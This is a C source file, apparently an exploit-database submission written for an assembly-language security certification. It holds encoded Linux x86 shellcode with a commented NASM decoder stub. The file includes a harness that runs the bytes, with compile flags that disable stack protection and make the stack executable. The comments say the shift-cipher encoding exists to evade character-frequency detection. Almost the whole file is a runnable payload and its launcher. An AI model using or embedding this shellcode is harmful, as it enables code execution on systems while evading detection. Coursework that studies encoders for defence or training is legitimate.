/*
# Exploit Title: Linux x86 Multi-Byte Shift Cipher Shellcode
# Date: 2018-08-26
# Shellcode Author: Kevin Kirsche
# Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_4-custom_encoding
# Tested on: Ubuntu 18.04 with gcc 7.3.0

This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
Student ID: SLAE-1134

Compilation instructions:
	gcc -o shellcode shellcode.c -fno-stack-protector -z execstack

Commented decoder NASM:
section .text

_start:
    jmp short jcp       ; jump to jcp (jump call pop) to begin our jump call
                        ; pop process of retrieving shellcode

shellcode_addr:
    pop esi             ; Store address of "shellcode" label in esi
decoder:
    ; multi-byte shift, so we shift one, then we shift two
    ; this helps avoid basic character frequency detection if the decoder
    ; is removed
    sub byte [esi], 0x06  ; Decode byte 1 at [esi]
    inc esi
    sub byte [esi], 0x17  ; Decode byte 2 at [esi]
    jz shellcode
    inc esi
    jmp short decoder

jcp:
    call shellcode_addr
    shellcode: db 0x37, 0xd7, 0x56, 0x7f, 0x35, 0x46, 0x79, 0x7f, 0x6e, 0x46, 0x68, 0x80, 0x74, 0xa0, 0xe9, 0x67, 0x8f, 0xf9, 0x59, 0xa0, 0xe7, 0xc7, 0x11, 0xe4, 0x86, 0xa7, 0x06, 0x17
*/
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\xeb\x0d\x5e\x80\x2e\x06\x46\x80\x2e\x17\x74\x08"
  "\x46\xeb\xf4\xe8\xee\xff\xff\xff\x37\xd7\x56\x7f\x35\x46\x79\x7f\x6e\x46"
  "\x68\x80\x74\xa0\xe9\x67\x8f\xf9\x59\xa0\xe7\xc7\x11\xe4\x86\xa7\x06\x17";

int main() {
  printf("Shellcode size: %d\n", strlen(shellcode));
  int (*ret)() = (int(*)())shellcode;
	ret();
}
